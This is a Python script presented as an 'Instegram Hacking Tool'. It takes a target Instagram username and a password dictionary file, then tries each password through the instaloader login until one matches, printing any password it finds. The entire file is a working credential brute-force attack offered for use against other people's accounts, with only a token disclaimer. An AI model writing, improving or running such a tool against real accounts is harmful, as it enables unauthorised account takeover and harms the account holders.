import instaloader
import os
import sys
import time
import datetime
import colorama
from colorama import init, Fore
init()
g = Fore.GREEN
y = Fore.YELLOW
c = Fore.CYAN
r = Fore.RED
w = Fore.WHITE

os.system('clear')

def logo():
    print(f"""{g}
         ███▄ ▄███▓ ▒█████   ██▓     ▒█████  ▒██   ██▒
        ▓██▒▀█▀ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒▒▒ █ █ ▒░
        ▓██    ▓██░▒██░  ██▒▒██░    ▒██░  ██▒░░  █   ░
        ▒██    ▒██ ▒██   ██░▒██░    ▒██   ██░ ░ █ █ ▒ 
        ▒██▒   ░██▒░ ████▓▒░░██████▒░ ████▓▒░▒██▒ ▒██▒
        ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
        ░  ░      ░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░░   ░▒ ░
        ░      ░   ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒   ░    ░  
               ░       ░ ░      ░  ░    ░ ░   ░    ░  
                  Instegram Hacking Tool
                  
**********************{w}By: {y}MaxMouse{g}**************************
    """)
    time.sleep(2)
    print(f"{g}[{w}Info{g}]{w}Speed of this tool depends on your network connection!")
    print(f"""{g}[{y}WARNING!{g}]{c}This tool is not made for any {r}critical{c} activities.
    So do not use this tool to damage anyone!\n""")

def bannar(user, pfile):
    print(f"{g}\n[{w}Info{g}]{y}Attack lounched!{g}")
    print(f"""-----------------------------------------------------------
    
    Target  : {w}{user}
    {g}File    : {w}{pfile}
    {g}Started : {w}{datetime.datetime.ctime(datetime.datetime.now())}{g}

-----------------------------------------------------------""")

L = instaloader.Instaloader()
def login(user, pfile):
    try:
        file = open(pfile, "r")
        for line in file:
            line = line.strip("\n")
            try:
                L.login(user, line)
                print(f"\n{g}[{w}KEY{g}]{y}Password found!: {c}{line}{g}")
                print(f"\n{g}Finished: {w}{datetime.datetime.ctime(datetime.datetime.now())}")
            except Exception:
                print(f"{g}[{r}-{g}]{r}Not matched! Trying another one!")
    except Exception as err:
        print(err)
try:
    logo()
    print(f"{y}***********************************************************")
    user = input(f"{w}      Enter your torget: {g}")
    pfile = input(f"{w}      File (Dictionary): {g}")
    print(f"{y}***********************************************************{g}")
    bannar(user, pfile)
    login(user, pfile)
except KeyboardInterrupt:
    print(f"{w}Cancelled!{g}")
except ValueError:
    print(f"{r}Enter valied data!{g}")
    print(f"\n{g}Finished: {w}{datetime.datetime.ctime(datetime.datetime.now())}")
    sys.exit(0)